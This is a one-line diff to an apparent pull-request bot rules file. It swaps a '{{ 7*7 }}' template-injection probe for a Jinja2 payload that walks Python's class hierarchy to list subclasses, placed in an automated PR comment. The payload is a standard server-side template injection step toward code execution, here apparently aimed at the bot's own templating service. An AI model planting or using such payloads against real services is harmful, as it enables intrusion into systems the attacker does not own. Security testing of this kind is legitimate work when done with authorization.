@@ -1,1 +1,1 @@
-pull_request_rules: [{name: ssti-test, conditions: [base=main], actions: {comment: {message: "{{ 7*7 }}"}}}]
+pull_request_rules: [{name: ssti-test2, conditions: [base=main], actions: {comment: {message: "{{ ''.__class__.__mro__[1].__subclasses__()|length }}"}}}]
